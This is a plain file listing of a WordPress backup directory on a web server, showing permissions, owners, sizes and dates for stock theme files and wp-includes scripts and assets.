-rw-r--r-- 1 www-data www-data 2412 Mar 16  2015 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/header.php
-rw-r--r-- 1 www-data www-data 11072 Apr  8  2016 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/languages/twentyfourteen.pot
-rw-r--r-- 1 www-data www-data 1187 Dec  6  2013 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/page.php
-rw-r--r-- 1 www-data www-data 28 Jun  5  2014 /var/www/backup_wordpress/wp-content/themes/index.php
-rw-r--r-- 1 www-data www-data 14589 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/functions.php
-rw-r--r-- 1 www-data www-data 2951 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/js/color-scheme-control.js
-rw-r--r-- 1 www-data www-data 1061 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/js/customize-preview.js
-rw-r--r-- 1 www-data www-data 527 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/js/keyboard-image-navigation.js
-rw-r--r-- 1 www-data www-data 1059 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/js/skip-link-focus-fix.js
-rw-r--r-- 1 www-data www-data 6820 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/js/functions.js
-rw-r--r-- 1 www-data www-data 10330 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/js/html5.js
-rw-r--r-- 1 www-data www-data 794 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/sidebar-content-bottom.php
-rw-r--r-- 1 www-data www-data 744 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/searchform.php
-rw-r--r-- 1 www-data www-data 1300 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/template-parts/content-search.php
-rw-r--r-- 1 www-data www-data 1436 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/template-parts/content-single.php
-rw-r--r-- 1 www-data www-data 1091 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/template-parts/content-none.php
-rw-r--r-- 1 www-data www-data 1166 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/template-parts/biography.php
-rw-r--r-- 1 www-data www-data 1223 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/template-parts/content-page.php
-rw-r--r-- 1 www-data www-data 1721 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/template-parts/content.php
-rw-r--r-- 1 www-data www-data 1714 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/single.php
-rw-r--r-- 1 www-data www-data 18092 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/genericons/LICENSE.txt
-rw-r--r-- 1 www-data www-data 22374 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/genericons/Genericons.eot
-rw-r--r-- 1 www-data www-data 1424 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/genericons/COPYING.txt
-rw-r--r-- 1 www-data www-data 76980 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/genericons/Genericons.svg
-rw-r--r-- 1 www-data www-data 10630 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/genericons/README.md
-rw-r--r-- 1 www-data www-data 13988 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/genericons/Genericons.woff
-rw-r--r-- 1 www-data www-data 28266 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/genericons/genericons.css
-rw-r--r-- 1 www-data www-data 22188 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/genericons/Genericons.ttf
-rw-r--r-- 1 www-data www-data 8107 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/inc/template-tags.php
-rw-r--r-- 1 www-data www-data 30505 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/inc/customizer.php
-rw-r--r-- 1 www-data www-data 2328 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/inc/back-compat.php
-rw-r--r-- 1 www-data www-data 390 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/sidebar.php
-rw-r--r-- 1 www-data www-data 1481 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/search.php
-rw-r--r-- 1 www-data www-data 1972 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/comments.php
-rw-r--r-- 1 www-data www-data 6630 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/css/editor-style.css
-rw-r--r-- 1 www-data www-data 2565 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/css/ie7.css
-rw-r--r-- 1 www-data www-data 748 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/css/ie.css
-rw-r--r-- 1 www-data www-data 3475 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/css/ie8.css
-rw-r--r-- 1 www-data www-data 879 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/404.php
-rw-r--r-- 1 www-data www-data 463555 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/screenshot.png
-rw-r--r-- 1 www-data www-data 68939 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/style.css
-rw-r--r-- 1 www-data www-data 3554 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/image.php
-rw-r--r-- 1 www-data www-data 2887 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/readme.txt
-rw-r--r-- 1 www-data www-data 1868 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/footer.php
-rw-r--r-- 1 www-data www-data 1960 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/archive.php
-rw-r--r-- 1 www-data www-data 12925 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/rtl.css
-rw-r--r-- 1 www-data www-data 1804 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/index.php
-rw-r--r-- 1 www-data www-data 4148 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/header.php
-rw-r--r-- 1 www-data www-data 7650 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/languages/twentysixteen.pot
-rw-r--r-- 1 www-data www-data 980 Apr 12  2016 /var/www/backup_wordpress/wp-content/themes/twentysixteen/page.php
-rw-r--r-- 1 www-data www-data 28 Jan  8  2012 /var/www/backup_wordpress/wp-content/index.php
-rw-r--r-- 1 www-data www-data 364 Dec 19  2015 /var/www/backup_wordpress/wp-blog-header.php
-rw-r--r-- 1 www-data www-data 20847 Mar 14  2016 /var/www/backup_wordpress/wp-includes/class-wp-image-editor-imagick.php
-rw-r--r-- 1 www-data www-data 46677 Jan 13  2016 /var/www/backup_wordpress/wp-includes/category-template.php
-rw-r--r-- 1 www-data www-data 27501 Mar  8  2016 /var/www/backup_wordpress/wp-includes/ms-blogs.php
-rw-r--r-- 1 www-data www-data 136603 Dec 23  2015 /var/www/backup_wordpress/wp-includes/class-phpmailer.php
-rw-r--r-- 1 www-data www-data 25198 Apr  7  2016 /var/www/backup_wordpress/wp-includes/class-wp-customize-setting.php
-rw-r--r-- 1 www-data www-data 1504 Sep 22  2015 /var/www/backup_wordpress/wp-includes/default-widgets.php
-rw-r--r-- 1 www-data www-data 23632 Mar  9  2016 /var/www/backup_wordpress/wp-includes/default-filters.php
-rw-r--r-- 1 www-data www-data 19408 Feb 24  2016 /var/www/backup_wordpress/wp-includes/class-wp-customize-control.php
-rw-r--r-- 1 www-data www-data 30277 Mar 10  2016 /var/www/backup_wordpress/wp-includes/meta.php
-rw-r--r-- 1 www-data www-data 11857 Mar 12  2016 /var/www/backup_wordpress/wp-includes/class-wp-embed.php
-rw-r--r-- 1 www-data www-data 162343 Mar  9  2016 /var/www/backup_wordpress/wp-includes/functions.php
-rw-r--r-- 1 www-data www-data 12692 Feb 25  2016 /var/www/backup_wordpress/wp-includes/js/plupload/wp-plupload.js
-rw-r--r-- 1 www-data www-data 113081 Oct 10  2015 /var/www/backup_wordpress/wp-includes/js/plupload/plupload.full.min.js
-rw-r--r-- 1 www-data www-data 4907 Sep 11  2015 /var/www/backup_wordpress/wp-includes/js/plupload/wp-plupload.min.js
-rw-r--r-- 1 www-data www-data 15968 Mar  9  2015 /var/www/backup_wordpress/wp-includes/js/plupload/handlers.js
-rw-r--r-- 1 www-data www-data 10466 Mar  9  2015 /var/www/backup_wordpress/wp-includes/js/plupload/handlers.min.js
-rw-r--r-- 1 www-data www-data 63118 Oct 10  2015 /var/www/backup_wordpress/wp-includes/js/plupload/plupload.silverlight.xap
-rw-r--r-- 1 www-data www-data 17987 Jul 29  2011 /var/www/backup_wordpress/wp-includes/js/plupload/license.txt
-rw-r--r-- 1 www-data www-data 29910 Oct 10  2015 /var/www/backup_wordpress/wp-includes/js/plupload/plupload.flash.swf
-rw-r--r-- 1 www-data www-data 10949 Sep 16  2015 /var/www/backup_wordpress/wp-includes/js/media-editor.min.js
-rw-r--r-- 1 www-data www-data 20255 Apr  1  2016 /var/www/backup_wordpress/wp-includes/js/wplink.js
-rw-r--r-- 1 www-data www-data 13361 Feb 24  2016 /var/www/backup_wordpress/wp-includes/js/media-grid.min.js
-rw-r--r-- 1 www-data www-data 1686 Mar 16  2016 /var/www/backup_wordpress/wp-includes/js/wp-emoji-loader.min.js
-rw-r--r-- 1 www-data www-data 5843 Feb 23  2016 /var/www/backup_wordpress/wp-includes/js/wp-embed-template.js
-rw-r--r-- 1 www-data www-data 3457 Jan 10  2008 /var/www/backup_wordpress/wp-includes/js/jquery/jquery.schedule.js
-rw-r--r-- 1 www-data www-data 1179 Apr 10  2012 /var/www/backup_wordpress/wp-includes/js/jquery/jquery.ui.touch-punch.js
-rw-r--r-- 1 www-data www-data 41719 Sep 16  2013 /var/www/backup_wordpress/wp-includes/js/jquery/jquery.form.js
-rw-r--r-- 1 www-data www-data 6991 Jan 13  2016 /var/www/backup_wordpress/wp-includes/js/jquery/suggest.js
-rw-r--r-- 1 www-data www-data 9633 Mar 23  2016 /var/www/backup_wordpress/wp-includes/js/jquery/jquery-migrate.min.js
-rw-r--r-- 1 www-data www-data 2295 Aug 22  2012 /var/www/backup_wordpress/wp-includes/js/jquery/jquery.table-hotkeys.min.js
-rw-r--r-- 1 www-data www-data 2993 Jan 13  2016 /var/www/backup_wordpress/wp-includes/js/jquery/suggest.min.js
-rw-r--r-- 1 www-data www-data 1836 Mar 27  2014 /var/www/backup_wordpress/wp-includes/js/jquery/jquery.masonry.min.js
-rw-r--r-- 1 www-data www-data 5612 Jan  1  2014 /var/www/backup_wordpress/wp-includes/js/jquery/jquery.hotkeys.js
-rw-r--r-- 1 www-data www-data 22363 Mar 23  2016 /var/www/backup_wordpress/wp-includes/js/jquery/jquery-migrate.js
-rw-r--r-- 1 www-data www-data 3785 Jan 29  2013 /var/www/backup_wordpress/wp-includes/js/jquery/jquery.query.js
-rw-r--r-- 1 www-data www-data 9295 Apr 10  2013 /var/www/backup_wordpress/wp-includes/js/jquery/jquery.color.min.js
-rw-r--r-- 1 www-data www-data 3730 Nov 14  2013 /var/www/backup_wordpress/wp-includes/js/jquery/jquery.table-hotkeys.js
-rw-r--r-- 1 www-data www-data 97201 Apr  6  2016 /var/www/backup_wordpress/wp-includes/js/jquery/jquery.js
-rw-r--r-- 1 www-data www-data 783 Jan 20  2011 /var/www/backup_wordpress/wp-includes/js/jquery/jquery.serialize-object.js
-rw-r--r-- 1 www-data www-data 1793 Aug 22  2012 /var/www/backup_wordpress/wp-includes/js/jquery/jquery.hotkeys.min.js
-rw-r--r-- 1 www-data www-data 14720 Sep 16  2013 /var/www/backup_wordpress/wp-includes/js/jquery/jquery.form.min.js
-rw-r--r-- 1 www-data www-data 2473 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/progressbar.min.js
-rw-r--r-- 1 www-data www-data 10991 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/slider.min.js
-rw-r--r-- 1 www-data www-data 6527 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/position.min.js
-rw-r--r-- 1 www-data www-data 1247 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/effect-bounce.min.js
-rw-r--r-- 1 www-data www-data 857 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/effect-transfer.min.js
-rw-r--r-- 1 www-data www-data 13432 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/effect.min.js
-rw-r--r-- 1 www-data www-data 3357 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/effect-size.min.js
-rw-r--r-- 1 www-data www-data 12122 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/tabs.min.js
-rw-r--r-- 1 www-data www-data 1101 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/effect-shake.min.js
-rw-r--r-- 1 www-data www-data 800 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/effect-pulsate.min.js
-rw-r--r-- 1 www-data www-data 918 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/effect-clip.min.js
-rw-r--r-- 1 www-data www-data 3997 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/core.min.js
-rw-r--r-- 1 www-data www-data 6271 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/droppable.min.js
-rw-r--r-- 1 www-data www-data 1139 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/effect-blind.min.js
-rw-r--r-- 1 www-data www-data 9600 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/menu.min.js
-rw-r--r-- 1 www-data www-data 18428 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/resizable.min.js
-rw-r--r-- 1 www-data www-data 7249 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/button.min.js
-rw-r--r-- 1 www-data www-data 18906 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/draggable.min.js
-rw-r--r-- 1 www-data www-data 12140 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/dialog.min.js
-rw-r--r-- 1 www-data www-data 515 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/effect-fade.min.js
-rw-r--r-- 1 www-data www-data 997 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/effect-drop.min.js
-rw-r--r-- 1 www-data www-data 1176 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/effect-explode.min.js
-rw-r--r-- 1 www-data www-data 8290 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/autocomplete.min.js
-rw-r--r-- 1 www-data www-data 8585 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/accordion.min.js
-rw-r--r-- 1 www-data www-data 7112 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/spinner.min.js
-rw-r--r-- 1 www-data www-data 5705 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/tooltip.min.js
-rw-r--r-- 1 www-data www-data 962 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/effect-slide.min.js
-rw-r--r-- 1 www-data www-data 783 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/effect-puff.min.js
-rw-r--r-- 1 www-data www-data 4264 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/selectable.min.js
-rw-r--r-- 1 www-data www-data 789 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/effect-highlight.min.js
-rw-r--r-- 1 www-data www-data 6913 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/widget.min.js
-rw-r--r-- 1 www-data www-data 8384 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/selectmenu.min.js
-rw-r--r-- 1 www-data www-data 1030 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/effect-fold.min.js
-rw-r--r-- 1 www-data www-data 36534 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/datepicker.min.js
-rw-r--r-- 1 www-data www-data 1122 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/effect-scale.min.js
-rw-r--r-- 1 www-data www-data 24912 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/sortable.min.js
-rw-r--r-- 1 www-data www-data 3151 Nov  7  2015 /var/www/backup_wordpress/wp-includes/js/jquery/ui/mouse.min.js
-rw-r--r-- 1 www-data www-data 2939 Feb 23  2016 /var/www/backup_wordpress/wp-includes/js/customize-views.min.js
-rw-r--r-- 1 www-data www-data 10231 Apr 17  2012 /var/www/backup_wordpress/wp-includes/js/swfobject.js
-rw-r--r-- 1 www-data www-data 3457 Apr 25  2014 /var/www/backup_wordpress/wp-includes/js/customize-models.min.js
-rw-r--r-- 1 www-data www-data 12696 Mar  8  2016 /var/www/backup_wordpress/wp-includes/js/customize-preview-nav-menus.js
-rw-r--r-- 1 www-data www-data 7352 Jan 13  2016 /var/www/backup_wordpress/wp-includes/js/wp-lists.min.js
-rw-r--r-- 1 www-data www-data 1825 Sep  8  2015 /var/www/backup_wordpress/wp-includes/js/utils.min.js
-rw-r--r-- 1 www-data www-data 6512 Mar 14  2016 /var/www/backup_wordpress/wp-includes/js/customize-preview.js
-rw-r--r-- 1 www-data www-data 5756 Dec 31  2015 /var/www/backup_wordpress/wp-includes/js/autosave.min.js
-rw-r--r-- 1 www-data www-data 21607 Jun 21  2015 /var/www/backup_wordpress/wp-includes/js/quicktags.js
-rw-r--r-- 1 www-data www-data 1053 Jun 13  2015 /var/www/backup_wordpress/wp-includes/js/wp-util.min.js
-rw-r--r-- 1 www-data www-data 6609 Nov 14  2013 /var/www/backup_wordpress/wp-includes/js/wp-pointer.js
-rw-r--r-- 1 www-data www-data 2964 Feb 23  2016 /var/www/backup_wordpress/wp-includes/js/wp-embed-template.min.js
-rw-r--r-- 1 www-data www-data 9398 Oct 21  2015 /var/www/backup_wordpress/wp-includes/js/mce-view.min.js
-rw-r--r-- 1 www-data www-data 11492 Jan 13  2016 /var/www/backup_wordpress/wp-includes/js/wp-lists.js
-rw-r--r-- 1 www-data www-data 237 Dec 28  2013 /var/www/backup_wordpress/wp-includes/js/wpdialog.min.js
-rw-r--r-- 1 www-data www-data 41174 Jul 20  2015 /var/www/backup_wordpress/wp-includes/js/media-models.js
-rw-r--r-- 1 www-data www-data 7049 Feb 18  2016 /var/www/backup_wordpress/wp-includes/js/customize-base.min.js
-rw-r--r-- 1 www-data www-data 31976 Apr  6  2015 /var/www/backup_wordpress/wp-includes/js/masonry.min.js
-rw-r--r-- 1 www-data www-data 12883 Feb 17  2016 /var/www/backup_wordpress/wp-includes/js/media-audiovideo.min.js
-rw-r--r-- 1 www-data www-data 23566 Feb 24  2016 /var/www/backup_wordpress/wp-includes/js/media-grid.js
-rw-r--r-- 1 www-data www-data 698728 Dec  4  2013 /var/www/backup_wordpress/wp-includes/js/zxcvbn.min.js
-rw-r--r-- 1 www-data www-data 323 Nov  7  2012 /var/www/backup_wordpress/wp-includes/js/jcrop/Jcrop.gif
-rw-r--r-- 1 www-data www-data 2124 Sep 21  2013 /var/www/backup_wordpress/wp-includes/js/jcrop/jquery.Jcrop.min.css
-rw-r--r-- 1 www-data www-data 15893 Sep 21  2013 /var/www/backup_wordpress/wp-includes/js/jcrop/jquery.Jcrop.min.js
-rw-r--r-- 1 www-data www-data 502 Nov 12  2013 /var/www/backup_wordpress/wp-includes/js/zxcvbn-async.js
-rw-r--r-- 1 www-data www-data 5488 Jul 28  2015 /var/www/backup_wordpress/wp-includes/js/heartbeat.min.js
-rw-r--r-- 1 www-data www-data 7190 Jul 20  2015 /var/www/backup_wordpress/wp-includes/js/admin-bar.min.js
-rw-r--r-- 1 www-data www-data 1403 Feb 25  2016 /var/www/backup_wordpress/wp-includes/js/wp-embed.min.js
-rw-r--r-- 1 www-data www-data 2890 Mar 14  2016 /var/www/backup_wordpress/wp-includes/js/customize-preview.min.js
-rw-r--r-- 1 www-data www-data 3306 Jan 13  2016 /var/www/backup_wordpress/wp-includes/js/wp-auth-check.js
-rw-r--r-- 1 www-data www-data 20271 Feb 18  2016 /var/www/backup_wordpress/wp-includes/js/customize-base.js
-rw-r--r-- 1 www-data www-data 7052 Sep  5  2015 /var/www/backup_wordpress/wp-includes/js/customize-loader.js
-rw-r--r-- 1 www-data www-data 3135 Jan 13  2016 /var/www/backup_wordpress/wp-includes/js/wp-ajax-response.js
-rw-r--r-- 1 www-data www-data 16208 Dec 31  2015 /var/www/backup_wordpress/wp-includes/js/autosave.js
-rw-r--r-- 1 www-data www-data 1563 Sep 11  2015 /var/www/backup_wordpress/wp-includes/js/mediaelement/jumpforward.png
-rw-r--r-- 1 www-data www-data 5276 Mar  9  2016 /var/www/backup_wordpress/wp-includes/js/mediaelement/wp-mediaelement.css
-rw-r--r-- 1 www-data www-data 1535 Jan 20  2016 /var/www/backup_wordpress/wp-includes/js/mediaelement/wp-mediaelement.js
-rw-r--r-- 1 www-data www-data 4245 Nov 29  2014 /var/www/backup_wordpress/wp-includes/js/mediaelement/skipback.png
-rw-r--r-- 1 www-data www-data 131611 Sep 11  2015 /var/www/backup_wordpress/wp-includes/js/mediaelement/flashmediaelement.swf
-rw-r--r-- 1 www-data www-data 80660 Sep 19  2015 /var/www/backup_wordpress/wp-includes/js/mediaelement/mediaelement-and-player.min.js
-rw-r--r-- 1 www-data www-data 6224 Mar 15  2013 /var/www/backup_wordpress/wp-includes/js/mediaelement/loading.gif
-rw-r--r-- 1 www-data www-data 1029 Sep 11  2015 /var/www/backup_wordpress/wp-includes/js/mediaelement/bigplay.svg
-rw-r--r-- 1 www-data www-data 1892 Mar 15  2013 /var/www/backup_wordpress/wp-includes/js/mediaelement/controls.png
-rw-r--r-- 1 www-data www-data 3001 Mar 15  2013 /var/www/backup_wordpress/wp-includes/js/mediaelement/bigplay.png
-rw-r--r-- 1 www-data www-data 12381 Mar  5  2015 /var/www/backup_wordpress/wp-includes/js/mediaelement/silverlightmediaelement.xap
-rw-r--r-- 1 www-data www-data 4717 Feb 29  2016 /var/www/backup_wordpress/wp-includes/js/mediaelement/wp-playlist.js
-rw-r--r-- 1 www-data www-data 3354 Feb 29  2016 /var/www/backup_wordpress/wp-includes/js/mediaelement/wp-playlist.min.js
-rw-r--r-- 1 www-data www-data 166 Mar 15  2013 /var/www/backup_wordpress/wp-includes/js/mediaelement/background.png
-rw-r--r-- 1 www-data www-data 10344 Mar 15  2013 /var/www/backup_wordpress/wp-includes/js/mediaelement/controls.svg
-rw-r--r-- 1 www-data www-data 20163 Sep 11  2015 /var/www/backup_wordpress/wp-includes/js/mediaelement/mediaelementplayer.min.css
-rw-r--r-- 1 www-data www-data 796 Feb 29  2016 /var/www/backup_wordpress/wp-includes/js/mediaelement/wp-mediaelement.min.js
-rw-r--r-- 1 www-data www-data 4477 Mar  9  2016 /var/www/backup_wordpress/wp-includes/js/mediaelement/wp-mediaelement.min.css
-rw-r--r-- 1 www-data www-data 1769 Jan  9  2015 /var/www/backup_wordpress/wp-includes/js/mediaelement/froogaloop.min.js
-rw-r--r-- 1 www-data www-data 11809 Jul 20  2015 /var/www/backup_wordpress/wp-includes/js/admin-bar.js
-rw-r--r-- 1 www-data www-data 3020 Jan 14  2016 /var/www/backup_wordpress/wp-includes/js/wp-backbone.min.js
-rw-r--r-- 1 www-data www-data 229831 Mar 30  2016 /var/www/backup_wordpress/wp-includes/js/media-views.js
-rw-r--r-- 1 www-data www-data 571 Nov 13  2013 /var/www/backup_wordpress/wp-includes/js/wp-list-revisions.min.js
-rw-r--r-- 1 www-data www-data 16410 Feb 17  2016 /var/www/backup_wordpress/wp-includes/js/underscore.min.js
-rw-r--r-- 1 www-data www-data 3217 Mar 25  2015 /var/www/backup_wordpress/wp-includes/js/customize-loader.min.js
-rw-r--r-- 1 www-data www-data 24513 Oct 21  2015 /var/www/backup_wordpress/wp-includes/js/mce-view.js
-rw-r--r-- 1 www-data www-data 16682 Jun 28  2015 /var/www/backup_wordpress/wp-includes/js/colorpicker.min.js
-rw-r--r-- 1 www-data www-data 10464 Oct  7  2015 /var/www/backup_wordpress/wp-includes/js/shortcode.js
-rw-r--r-- 1 www-data www-data 435 Dec 28  2013 /var/www/backup_wordpress/wp-includes/js/wpdialog.js
-rw-r--r-- 1 www-data www-data 4949 Mar 11  2015 /var/www/backup_wordpress/wp-includes/js/hoverIntent.js
-rw-r--r-- 1 www-data www-data 13084 Mar 10  2016 /var/www/backup_wordpress/wp-includes/js/thickbox/thickbox.js
-rw-r--r-- 1 www-data www-data 2455 Mar 10  2016 /var/www/backup_wordpress/wp-includes/js/thickbox/thickbox.css
-rw-r--r-- 1 www-data www-data 15238 Nov  5  2012 /var/www/backup_wordpress/wp-includes/js/thickbox/loadingAnimation.gif
-rw-r--r-- 1 www-data www-data 94 Nov  7  2012 /var/www/backup_wordpress/wp-includes/js/thickbox/macFFBgHack.png
-rw-r--r-- 1 www-data www-data 26068 Mar 21  2016 /var/www/backup_wordpress/wp-includes/js/customize-selective-refresh.js
-rw-r--r-- 1 www-data www-data 7621 Mar 21  2016 /var/www/backup_wordpress/wp-includes/js/customize-preview-widgets.min.js
-rw-r--r-- 1 www-data www-data 104338 Mar 30  2016 /var/www/backup_wordpress/wp-includes/js/media-views.min.js
-rw-r--r-- 1 www-data www-data 914 Nov 14  2013 /var/www/backup_wordpress/wp-includes/js/wp-list-revisions.js
-rw-r--r-- 1 www-data www-data 10894 Apr  1  2016 /var/www/backup_wordpress/wp-includes/js/wplink.min.js
-rw-r--r-- 1 www-data www-data 1078 Nov 18  2015 /var/www/backup_wordpress/wp-includes/js/comment-reply.min.js
-rw-r--r-- 1 www-data www-data 4519 Sep  8  2015 /var/www/backup_wordpress/wp-includes/js/utils.js
-rw-r--r-- 1 www-data www-data 643 Jun 29  2015 /var/www/backup_wordpress/wp-includes/js/wp-a11y.min.js
-rw-r--r-- 1 www-data www-data 5426 Feb 23  2016 /var/www/backup_wordpress/wp-includes/js/customize-views.js
-rw-r--r-- 1 www-data www-data 3128 Feb 25  2016 /var/www/backup_wordpress/wp-includes/js/wp-embed.js
-rw-r--r-- 1 www-data www-data 10427 Jan 14  2016 /var/www/backup_wordpress/wp-includes/js/wp-backbone.js
-rw-r--r-- 1 www-data www-data 2619 Mar 13  2016 /var/www/backup_wordpress/wp-includes/js/wp-emoji.min.js
-rw-r--r-- 1 www-data www-data 9802 Mar 13  2016 /var/www/backup_wordpress/wp-includes/js/wp-emoji-release.min.js
-rw-r--r-- 1 www-data www-data 1115 Mar 11  2015 /var/www/backup_wordpress/wp-includes/js/hoverIntent.min.js
-rw-r--r-- 1 www-data www-data 3283 Jun 28  2015 /var/www/backup_wordpress/wp-includes/js/tw-sack.min.js
-rw-r--r-- 1 www-data www-data 4969 Aug 22  2012 /var/www/backup_wordpress/wp-includes/js/tw-sack.js
-rw-r--r-- 1 www-data www-data 2685 Nov 18  2015 /var/www/backup_wordpress/wp-includes/js/comment-reply.js
-rw-r--r-- 1 www-data www-data 23691 Mar  9  2016 /var/www/backup_wordpress/wp-includes/js/twemoji.js
-rw-r--r-- 1 www-data www-data 20076 Feb 25  2016 /var/www/backup_wordpress/wp-includes/js/heartbeat.js
-rw-r--r-- 1 www-data www-data 23060 Feb 17  2016 /var/www/backup_wordpress/wp-includes/js/backbone.min.js
-rw-r--r-- 1 www-data www-data 5873 Jul 19  2015 /var/www/backup_wordpress/wp-includes/js/customize-models.js
-rw-r--r-- 1 www-data www-data 29083 Nov 17  2012 /var/www/backup_wordpress/wp-includes/js/colorpicker.js
-rw-r--r-- 1 www-data www-data 324 Jan 28  2014 /var/www/backup_wordpress/wp-includes/js/zxcvbn-async.min.js
-rw-r--r-- 1 www-data www-data 12234 Jul 29  2011 /var/www/backup_wordpress/wp-includes/js/swfupload/plugins/swfupload.speed.js
-rw-r--r-- 1 www-data www-data 1572 Jul 29  2011 /var/www/backup_wordpress/wp-includes/js/swfupload/plugins/swfupload.cookies.js
-rw-r--r-- 1 www-data www-data 3383 Jul 29  2011 /var/www/backup_wordpress/wp-includes/js/swfupload/plugins/swfupload.queue.js
-rw-r--r-- 1 www-data www-data 3926 Jul 29  2011 /var/www/backup_wordpress/wp-includes/js/swfupload/plugins/swfupload.swfobject.js
-rw-r--r-- 1 www-data www-data 37691 Aug 12  2014 /var/www/backup_wordpress/wp-includes/js/swfupload/swfupload.js
-rw-r--r-- 1 www-data www-data 12655 Feb 24  2014 /var/www/backup_wordpress/wp-includes/js/swfupload/handlers.js
-rw-r--r-- 1 www-data www-data 8867 Jun 21  2013 /var/www/backup_wordpress/wp-includes/js/swfupload/handlers.min.js
-rw-r--r-- 1 www-data www-data 13133 Jul 29  2013 /var/www/backup_wordpress/wp-includes/js/swfupload/swfupload.swf
-rw-r--r-- 1 www-data www-data 1540 Jul 29  2011 /var/www/backup_wordpress/wp-includes/js/swfupload/license.txt
-rw-r--r-- 1 www-data www-data 178 Nov  7  2012 /var/www/backup_wordpress/wp-includes/js/imgareaselect/border-anim-v.gif
